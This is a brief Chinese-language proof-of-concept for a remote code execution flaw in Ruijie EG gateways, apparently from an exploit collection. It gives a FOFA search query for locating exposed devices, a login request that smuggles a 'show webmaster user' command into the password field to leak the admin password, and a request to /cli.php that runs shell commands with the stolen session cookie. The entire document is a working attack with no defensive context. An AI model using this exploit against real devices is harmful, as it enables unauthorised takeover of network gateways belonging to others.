##  锐捷-EG易网关存在RCE漏洞

## fofa
```
app="Ruijie-EG易网关"
```

## poc
```
获取用户密码
POST /login.php HTTP/1.1
Host: 10.10.10.10
User-Agent: Go-http-client/1.1
Content-Length: 49
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

username=admin&password=admin?show+webmaster+user

命令执行
POST /cli.php?a=shell HTTP/1.1
Host: 10.10.10.10
User-Agent: Go-http-client/1.1
Content-Length: 24
Content-Type: application/x-www-form-urlencoded
Cookie: 利用登录后Cookie的RUIJIEID字段进行替换，;user=admin; 
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

notdelay=true&command=ls
```
